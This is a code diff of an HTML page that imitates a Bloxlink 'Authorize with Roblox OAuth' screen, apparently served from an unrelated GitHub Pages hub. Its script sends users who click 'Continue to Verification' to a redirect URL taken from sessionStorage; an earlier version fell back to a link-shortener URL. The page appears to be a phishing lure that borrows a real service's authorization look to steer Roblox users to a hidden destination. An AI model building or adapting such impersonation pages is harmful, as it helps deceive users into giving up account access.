@@ -4,406 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Bloxlink OAuth · Authorize</title>
-    <!-- Inter font -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,500;14..32,600&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            cursor: auto;
-            font-family: 'Inter', Helvetica, Arial, sans-serif;
-            font-weight: 600;
-            font-size: 14px;
-            line-height: 19.6px;
-            color: rgb(254, 254, 254);
-            background-color: rgb(16, 19, 23);
-            min-height: 100vh;
-        }
-
-        .oauth-root {
-            display: flex;
-            flex-direction: column;
-            width: 100%;
-            min-height: 100vh;
-        }
-
-        .oauth-header {
-            display: flex;
-            flex-flow: row wrap;
-            justify-content: space-between;
-            align-items: center;
-            width: 100%;
-            height: 60px;
-            position: fixed;
-            top: 0;
-            left: 0;
-            background-color: rgb(19, 17, 19);
-            padding: 0 48px;
-            z-index: 9999;
-        }
-
-        .header-logo img {
-            display: block;
-            width: 195px;
-            height: auto;
-        }
-
-        .auth-main {
-            max-width: 1280px;
-            padding-left: 24px;
-            padding-right: 24px;
-            width: 100%;
-            margin: 137px auto 0;
-            flex-grow: 1;
-        }
-
-        .auth-title {
-            margin: 0;
-            color: rgb(253, 254, 254);
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 24px;
-            line-height: 32.4px;
-            display: block;
-            text-align: center;
-            padding: 24px 0;
-        }
-
-        .auth-divider-hr {
-            margin: 0 0 24px;
-            border: none;
-            border-bottom: 1px solid rgb(48, 52, 58);
-            flex-shrink: 0;
-        }
-
-        .auth-card {
-            width: 434px;
-            margin: 0 auto;
-            padding-top: 24px;
-        }
-
-        .avatar-circle {
-            position: relative;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            font-size: 20px;
-            line-height: 20px;
-            border-radius: 50%;
-            overflow: hidden;
-            user-select: none;
-            display: block;
-            width: 115px;
-            height: 115px;
-            margin: 0 auto;
-        }
-
-        .avatar-img {
-            width: 100%;
-            height: 115px;
-            object-fit: cover;
-            color: transparent;
-            text-indent: 10000px;
-            display: block;
-        }
-
-        .app-name {
-            margin: 8px 0 0;
-            color: rgb(255, 255, 255);
-            font-weight: 600;
-            font-size: 16px;
-            line-height: 16px;
-            text-align: center;
-        }
-
-        .btn-primary {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            box-sizing: border-box;
-            outline: none;
-            border: none;
-            cursor: pointer;
-            user-select: none;
-            vertical-align: middle;
-            appearance: none;
-            text-decoration: none;
-            min-width: 64px;
-            transition: background-color 0.25s cubic-bezier(0.4, 0, 0.2, 1), box-shadow 0.25s cubic-bezier(0.4, 0, 0.2, 1), border-color 0.25s cubic-bezier(0.4, 0, 0.2, 1), color 0.25s cubic-bezier(0.4, 0, 0.2, 1);
-            background-color: rgb(229, 229, 230);
-            width: 100%;
-            font-family: 'Inter', Helvetica, Arial, sans-serif;
-            font-weight: 600;
-            font-size: 16px;
-            line-height: 16px;
-            border-radius: 8px;
-            padding: 10px 16px;
-            text-transform: none;
-            box-shadow: none;
-            color: rgb(17, 18, 22);
-            margin: 24px 0;
-        }
-
-        .btn-primary span {
-            position: absolute;
-            inset: 0;
-            border-radius: 8px;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .separator-row {
-            display: flex;
-            align-items: center;
-            margin-bottom: 24px;
-        }
-
-        .separator-line {
-            border-bottom: 1px solid rgba(255, 255, 255, 0.12);
-            width: 100%;
-        }
-
-        .separator-text {
-            margin: 0;
-            color: rgb(255, 255, 255);
-            font-weight: 300;
-            font-size: 14px;
-            line-height: 19.6px;
-            padding: 0 4px;
-        }
-
-        .btn-secondary {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            box-sizing: border-box;
-            background-color: transparent;
-            outline: none;
-            margin: 0;
-            cursor: pointer;
-            user-select: none;
-            vertical-align: middle;
-            appearance: none;
-            text-decoration: none;
-            min-width: 64px;
-            transition: background-color 0.25s cubic-bezier(0.4, 0, 0.2, 1), box-shadow 0.25s cubic-bezier(0.4, 0, 0.2, 1), border-color 0.25s cubic-bezier(0.4, 0, 0.2, 1), color 0.25s cubic-bezier(0.4, 0, 0.2, 1);
-            color: rgb(229, 229, 230);
-            width: 100%;
-            font-family: 'Inter', Helvetica, Arial, sans-serif;
-            font-weight: 600;
-            font-size: 16px;
-            line-height: 16px;
-            border-radius: 8px;
-            padding: 9px 15px;
-            text-transform: none;
-            border: 1px solid rgba(249, 249, 249, 0.16);
-            position: relative;
-        }
-
-        .btn-secondary span {
-            overflow: hidden;
-            pointer-events: none;
-            position: absolute;
-            z-index: 0;
-            inset: 0;
-            border-radius: 8px;
-        }
-
-        .oauth-footer {
-            display: flex;
-            flex-flow: row wrap;
-            justify-content: center;
-            align-items: flex-start;
-            width: 100%;
-            max-width: 1024px;
-            margin: 48px auto 24px;
-            padding: 32px 40px;
-        }
-
-        .footer-logo-block {
-            flex: 0 0 auto;
-            width: auto;
-            margin: 0 48px 0 0;
-            height: 36px;
-        }
-
-        .footer-links-row {
-            flex-basis: 100%;
-            max-width: 100%;
-            display: flex;
-            flex-flow: row wrap;
-            width: 100%;
-            margin: 0 0 4px;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .footer-link {
-            margin: 0;
-            font-family: 'Inter', Helvetica, Arial, sans-serif;
-            font-size: 14px;
-            line-height: 19.6px;
-            letter-spacing: normal;
-            text-decoration: none;
-            color: rgb(85, 193, 255);
-            font-weight: 500;
-            text-underline-offset: 4px;
-        }
-
-        .footer-text {
-            margin: 0;
-            letter-spacing: normal;
-            text-decoration: none;
-            font-family: 'Inter', Helvetica, Arial, sans-serif;
-            font-weight: 300;
-            font-size: 14px;
-            line-height: 19.6px;
-            color: rgb(187, 188, 190);
-        }
-
-        .footer-bullet {
-            margin: 0 32px;
-            color: rgb(187, 188, 190);
-            font-weight: 300;
-        }
-
-        .footer-copyright-row {
-            display: flex;
-            flex-flow: row wrap;
-            width: 100%;
-            margin: 16px 0 0;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .copyright {
-            color: rgb(187, 188, 190);
-            font-weight: 300;
-        }
-
-        .sr-only {
-            border: 0;
-            clip: rect(0,0,0,0);
-            height: 1px;
-            margin: -1px;
-            overflow: hidden;
-            padding: 0;
-            position: absolute;
-            width: 1px;
-            white-space: nowrap;
-        }
-
-        .info-message {
-            color: #aaa;
-            font-size: 14px;
-            margin: 10px 0 20px;
-            text-align: center;
-            background: #1a2a2a;
-            padding: 12px;
-            border-radius: 8px;
-            border-left: 3px solid #00f2ea;
-        }
-
-        @media (max-width: 768px) {
-            .auth-main {
-                padding-left: 12px !important;
-                padding-right: 12px !important;
-                margin-top: 80px !important;
-                text-align: center !important;
-                display: flex !important;
-                flex-direction: column !important;
-                align-items: center !important;
-                justify-content: center !important;
-                min-height: 60vh !important;
-            }
-
-            .auth-card {
-                width: calc(100% - 24px) !important;
-                max-width: 400px !important;
-                margin: auto !important;
-                padding-top: 16px !important;
-                text-align: center !important;
-                display: flex !important;
-                flex-direction: column !important;
-                align-items: center !important;
-            }
-
-            .auth-title {
-                font-size: 20px !important;
-                line-height: 28px !important;
-                padding: 16px 0 !important;
-                text-align: center !important;
-                width: 100% !important;
-            }
-
-            .btn-primary, .btn-secondary {
-                padding: 12px 16px !important;
-                font-size: 16px !important;
-                min-height: 44px !important;
-                width: 100% !important;
-                max-width: 300px !important;
-                margin: 8px auto !important;
-                text-align: center !important;
-            }
-
-            .oauth-header {
-                padding: 0 16px !important;
-                height: 50px !important;
-            }
-
-            .header-logo img {
-                width: 140px !important;
-                height: auto !important;
-            }
-
-            .avatar-circle {
-                width: 80px !important;
-                height: 80px !important;
-                margin: 0 auto 16px auto !important;
-            }
-
-            .avatar-img {
-                height: 80px !important;
-            }
-
-            .app-name {
-                text-align: center !important;
-                width: 100% !important;
-                margin: 8px 0 24px 0 !important;
-            }
-
-            .separator-row {
-                display: flex !important;
-                align-items: center !important;
-                justify-content: center !important;
-                width: 100% !important;
-                margin: 16px 0 !important;
-            }
-
-            .separator-line {
-                flex: 1 !important;
-                height: 1px !important;
-                background: rgba(255, 255, 255, 0.12) !important;
-                border: none;
-            }
-
-            .separator-text {
-                margin: 0 12px !important;
-                text-align: center !important;
-            }
-
-            .auth-divider-hr {
-                width: 100% !important;
-                margin: 16px 0 !important;
-            }
-        }
+        *{margin:0;padding:0;box-sizing:border-box}body{cursor:auto;font-family:'Inter',Helvetica,Arial,sans-serif;font-weight:600;font-size:14px;line-height:19.6px;color:#fefefe;background-color:#101317;min-height:100vh}.oauth-root{display:flex;flex-direction:column;width:100%;min-height:100vh}.oauth-header{display:flex;flex-flow:row wrap;justify-content:space-between;align-items:center;width:100%;height:60px;position:fixed;top:0;left:0;background-color:#131113;padding:0 48px;z-index:9999}.header-logo img{display:block;width:195px;height:auto}.auth-main{max-width:1280px;padding-left:24px;padding-right:24px;width:100%;margin:137px auto 0;flex-grow:1}.auth-title{margin:0;color:#fdfefe;text-decoration:none;font-weight:600;font-size:24px;line-height:32.4px;display:block;text-align:center;padding:24px 0}.auth-divider-hr{margin:0 0 24px;border:none;border-bottom:1px solid #30343a;flex-shrink:0}.auth-card{width:434px;margin:0 auto;padding-top:24px}.avatar-circle{position:relative;align-items:center;justify-content:center;flex-shrink:0;font-size:20px;line-height:20px;border-radius:50%;overflow:hidden;user-select:none;display:block;width:115px;height:115px;margin:0 auto}.avatar-img{width:100%;height:115px;object-fit:cover;color:transparent;text-indent:10000px;display:block}.app-name{margin:8px 0 0;color:#fff;font-weight:600;font-size:16px;line-height:16px;text-align:center}.btn-primary{display:inline-flex;align-items:center;justify-content:center;position:relative;box-sizing:border-box;outline:none;border:none;cursor:pointer;user-select:none;vertical-align:middle;appearance:none;text-decoration:none;min-width:64px;transition:background-color .25s cubic-bezier(0.4,0,0.2,1),box-shadow .25s cubic-bezier(0.4,0,0.2,1),border-color .25s cubic-bezier(0.4,0,0.2,1),color .25s cubic-bezier(0.4,0,0.2,1);background-color:#e5e5e6;width:100%;font-family:'Inter',Helvetica,Arial,sans-serif;font-weight:600;font-size:16px;line-height:16px;border-radius:8px;padding:10px 16px;text-transform:none;box-shadow:none;color:#111216;margin:24px 0}.btn-primary span{position:absolute;inset:0;border-radius:8px;pointer-events:none;z-index:0}.separator-row{display:flex;align-items:center;margin-bottom:24px}.separator-line{border-bottom:1px solid rgba(255,255,255,0.12);width:100%}.separator-text{margin:0;color:#fff;font-weight:300;font-size:14px;line-height:19.6px;padding:0 4px}.btn-secondary{display:inline-flex;align-items:center;justify-content:center;box-sizing:border-box;background-color:transparent;outline:none;margin:0;cursor:pointer;user-select:none;vertical-align:middle;appearance:none;text-decoration:none;min-width:64px;transition:background-color .25s cubic-bezier(0.4,0,0.2,1),box-shadow .25s cubic-bezier(0.4,0,0.2,1),border-color .25s cubic-bezier(0.4,0,0.2,1),color .25s cubic-bezier(0.4,0,0.2,1);color:#e5e5e6;width:100%;font-family:'Inter',Helvetica,Arial,sans-serif;font-weight:600;font-size:16px;line-height:16px;border-radius:8px;padding:9px 15px;text-transform:none;border:1px solid rgba(249,249,249,0.16);position:relative}.btn-secondary span{overflow:hidden;pointer-events:none;position:absolute;z-index:0;inset:0;border-radius:8px}.oauth-footer{display:flex;flex-flow:row wrap;justify-content:center;align-items:flex-start;width:100%;max-width:1024px;margin:48px auto 24px;padding:32px 40px}.footer-logo-block{flex:0 0 auto;width:auto;margin:0 48px 0 0;height:36px}.footer-links-row{flex-basis:100%;max-width:100%;display:flex;flex-flow:row wrap;width:100%;margin:0 0 4px;justify-content:center;align-items:center}.footer-link{margin:0;font-family:'Inter',Helvetica,Arial,sans-serif;font-size:14px;line-height:19.6px;letter-spacing:normal;text-decoration:none;color:#55c1ff;font-weight:500;text-underline-offset:4px}.footer-text{margin:0;letter-spacing:normal;text-decoration:none;font-family:'Inter',Helvetica,Arial,sans-serif;font-weight:300;font-size:14px;line-height:19.6px;color:#bbbcbe}.footer-bullet{margin:0 32px;color:#bbbcbe;font-weight:300}.footer-copyright-row{display:flex;flex-flow:row wrap;width:100%;margin:16px 0 0;justify-content:center;align-items:center}.copyright{color:#bbbcbe;font-weight:300}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px;white-space:nowrap}.info-message{color:#aaa;font-size:14px;margin:10px 0 20px;text-align:center;background:#1a2a2a;padding:12px;border-radius:8px;border-left:3px solid #00f2ea}.debug-info{color:#888;font-size:12px;margin-top:5px;text-align:center;word-break:break-all}@media (max-width:768px){.auth-main{padding-left:12px!important;padding-right:12px!important;margin-top:80px!important;text-align:center!important;display:flex!important;flex-direction:column!important;align-items:center!important;justify-content:center!important;min-height:60vh!important}.auth-card{width:calc(100% - 24px)!important;max-width:400px!important;margin:auto!important;padding-top:16px!important;text-align:center!important;display:flex!important;flex-direction:column!important;align-items:center!important}.auth-title{font-size:20px!important;line-height:28px!important;padding:16px 0!important;text-align:center!important;width:100%!important}.btn-primary,.btn-secondary{padding:12px 16px!important;font-size:16px!important;min-height:44px!important;width:100%!important;max-width:300px!important;margin:8px auto!important;text-align:center!important}.oauth-header{padding:0 16px!important;height:50px!important}.header-logo img{width:140px!important;height:auto!important}.avatar-circle{width:80px!important;height:80px!important;margin:0 auto 16px auto!important}.avatar-img{height:80px!important}.app-name{text-align:center!important;width:100%!important;margin:8px 0 24px 0!important}.separator-row{display:flex!important;align-items:center!important;justify-content:center!important;width:100%!important;margin:16px 0!important}.separator-line{flex:1!important;height:1px!important;background:rgba(255,255,255,0.12)!important;border:none}.separator-text{margin:0 12px!important;text-align:center!important}.auth-divider-hr{width:100%!important;margin:16px 0!important}}
     </style>
 </head>
 <body>
@@ -414,42 +19,39 @@
                      alt="Bloxlink logo" width="195" height="35" style="display:block;">
             </div>
         </header>
-
         <div class="auth-main" id="auth-container">
             <span class="auth-title">Authorize with Roblox OAuth</span>
             <hr class="auth-divider-hr" />
-
             <div class="auth-card">
-                <!-- Info message - no auto redirect -->
                 <div class="info-message">
                     Click "Continue" to proceed to verification
                 </div>
+                
+                <!-- Debug info (hidden by default) -->
+                <div class="debug-info" id="debugInfo"></div>
 
                 <div class="avatar-circle">
                     <img alt="App avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='115' height='115' viewBox='0 0 115 115'%3E%3Crect width='115' height='115' fill='%23333c4a' /%3E%3Ccircle cx='57.5' cy='45' r='22' fill='%235a6b7c' /%3E%3Crect x='35' y='70' width='45' height='30' rx='10' fill='%235a6b7c' /%3E%3C/svg%3E"
                          class="avatar-img" />
                 </div>
                 <span class="app-name">Bloxlink</span>
-
-                <!-- Primary approve button - user must click to redirect -->
+                
                 <button class="btn-primary" tabindex="0" type="button" id="continueBtn">
                     Continue to Verification
                     <span></span>
                 </button>
-
+                
                 <div class="separator-row">
                     <div class="separator-line"></div>
                     <span class="separator-text">or</span>
                     <div class="separator-line"></div>
                 </div>
-
-                <!-- Secondary button - returns to main hub -->
-                <button class="btn-secondary" tabindex="0" type="button" onclick="window.location.href='https://dikilia.github.io/lokus-hub/'">
+                
+                <button class="btn-secondary" tabindex="0" type="button" id="returnBtn">
                     <span>Return to Hub</span>
                     <span></span>
                 </button>
             </div>
-
             <div class="oauth-footer">
                 <div class="footer-logo-block">
                     <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -474,24 +76,39 @@
             </div>
         </div>
     </div>
-
     <div style="box-sizing: border-box;">
         <p aria-live="assertive" role="alert" class="sr-only">Approve - Roblox</p>
     </div>
-
     <script>
         // Get the redirect URL from sessionStorage (set by index.html)
-        const redirectUrl = sessionStorage.getItem('bloxlinkRedirect') || 'https://openinapp.link/jvj3l';
+        const redirectUrl = sessionStorage.getItem('bloxlinkRedirect');
         
-        // Debug: show what URL we're redirecting to (in console only)
-        console.log('🔗 Ready to redirect to:', redirectUrl);
+        // Debug element
+        const debugEl = document.getElementById('debugInfo');
         
-        // ONLY redirect when user clicks the button
-        document.getElementById('continueBtn').onclick = function() {
-            window.location.href = redirectUrl;
-        };
+        // Check if URL exists
+        if (!redirectUrl) {
+            debugEl.textContent = '⚠️ No redirect URL found. Please return to hub.';
+            debugEl.style.color = '#ff8888';
+        } else {
+            debugEl.textContent = `🔗 Redirect URL: ${redirectUrl}`;
+            debugEl.style.color = '#00f2ea';
+            console.log('✅ Bloxlink page loaded. Will redirect to:', redirectUrl);
+        }
         
-        // No automatic redirect - user must click
+        // Continue button - redirects to the stored URL
+        document.getElementById('continueBtn').addEventListener('click', function() {
+            if (redirectUrl) {
+                window.location.href = redirectUrl;
+            } else {
+                alert('No redirect URL configured. Please return to hub.');
+            }
+        });
+        
+        // Return button - goes back to main hub
+        document.getElementById('returnBtn').addEventListener('click', function() {
+            window.location.href = 'https://dikilia.github.io/lokus-hub/';
+        });
     </script>
 </body>
 </html>
